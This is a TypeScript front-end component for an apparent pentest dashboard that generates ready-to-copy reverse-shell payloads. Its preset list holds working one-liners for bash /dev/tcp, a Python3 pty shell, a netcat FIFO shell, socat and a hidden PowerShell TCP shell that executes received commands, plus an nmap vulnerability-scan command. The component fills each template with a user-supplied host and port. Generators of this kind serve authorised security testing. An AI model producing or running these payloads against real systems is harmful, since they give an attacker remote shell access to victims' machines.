import { playCircuitSurgeAudio, playTacticalTargetLock } from "../services/audio";
import { copyText } from "../services/clipboard";
import { button, element } from "../utils/dom";
import { triggerHexShockwave, triggerSparkBurst } from "../utils/particles";

interface PayloadPreset {
  id: string;
  name: string;
  template: (host: string, port: string) => string;
}

const PRESETS: PayloadPreset[] = [
  {
    id: "bash",
    name: "BASH TCP",
    template: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
  },
  {
    id: "python",
    name: "PYTHON3 PTY",
    template: (h, p) =>
      `python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
  },
  {
    id: "nc",
    name: "NETCAT FIFO",
    template: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ${h} ${p} >/tmp/f`,
  },
  {
    id: "socat",
    name: "SOCAT TTY",
    template: (h, p) => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${h}:${p}`,
  },
  {
    id: "nmap",
    name: "NMAP VULN",
    template: (h, _p) => `nmap -sV -sC --script vuln -p- -T4 --min-rate 1000 ${h}`,
  },
  {
    id: "powershell",
    name: "POWERSHELL",
    template: (h, p) =>
      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${h}",${p});$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($sb+"PS> "),0,$sb.Length+4);}`,
  },
];

export function createPayloadGenerator(): HTMLElement {
  const container = element("div", "tactical-payload-generator");

  const header = element("div", "payload-header");
  const title = element("span", "payload-title", "// PAYLOAD GENERATOR & REVERSE SHELL COMPOSER");
  header.append(title);

  // Preset Selector Pills
  const presetList = element("div", "payload-preset-list");
  let activePreset = PRESETS[0];

  // Parameters Row
  const paramsRow = element("div", "payload-params-row");
  const hostGroup = element("label", "payload-param-group");
  hostGroup.append(element("span", "payload-param-label", "LHOST / TARGET IP"));
  const hostInput = element("input", "payload-input") as HTMLInputElement;
  hostInput.type = "text";
  hostInput.value = "10.10.14.1";
  hostInput.placeholder = "10.10.14.1";
  hostGroup.append(hostInput);

  const portGroup = element("label", "payload-param-group");
  portGroup.append(element("span", "payload-param-label", "LPORT"));
  const portInput = element("input", "payload-input") as HTMLInputElement;
  portInput.type = "text";
  portInput.value = "4444";
  portInput.placeholder = "4444";
  portGroup.append(portInput);

  paramsRow.append(hostGroup, portGroup);

  // Generated Code Box
  const codeBox = element("div", "payload-code-box");
  const codeEl = element("code", "payload-code-text");
  codeBox.append(codeEl);

  // Action Button
  const copyBtn = button("primary-button payload-copy-btn", "COPY PAYLOAD");

  function update() {
    const h = hostInput.value.trim() || "10.10.14.1";
    const p = portInput.value.trim() || "4444";
    codeEl.textContent = activePreset.template(h, p);
  }

  PRESETS.forEach((preset) => {
    const pill = button(
      `payload-preset-pill ${preset.id === activePreset.id ? "active" : ""}`,
      preset.name,
    );
    pill.addEventListener("click", () => {
      playTacticalTargetLock();
      presetList.querySelectorAll(".payload-preset-pill").forEach((el) => el.classList.remove("active"));
      pill.classList.add("active");
      activePreset = preset;
      update();
    });
    presetList.append(pill);
  });

  hostInput.addEventListener("input", update);
  portInput.addEventListener("input", update);

  copyBtn.addEventListener("click", async () => {
    playCircuitSurgeAudio();
    const rect = copyBtn.getBoundingClientRect();
    const cx = rect.left + rect.width / 2;
    const cy = rect.top + rect.height / 2;
    triggerSparkBurst(cx, cy);
    triggerHexShockwave(cx, cy);

    codeBox.classList.add("payload-surge");
    window.setTimeout(() => codeBox.classList.remove("payload-surge"), 850);

    const prev = copyBtn.textContent;
    copyBtn.textContent = "PAYLOAD COPIED!";
    copyBtn.classList.add("copied");

    await copyText(codeEl.textContent ?? "");

    window.setTimeout(() => {
      copyBtn.textContent = prev;
      copyBtn.classList.remove("copied");
    }, 1200);
  });

  update();

  container.append(header, presetList, paramsRow, codeBox, copyBtn);
  return container;
}
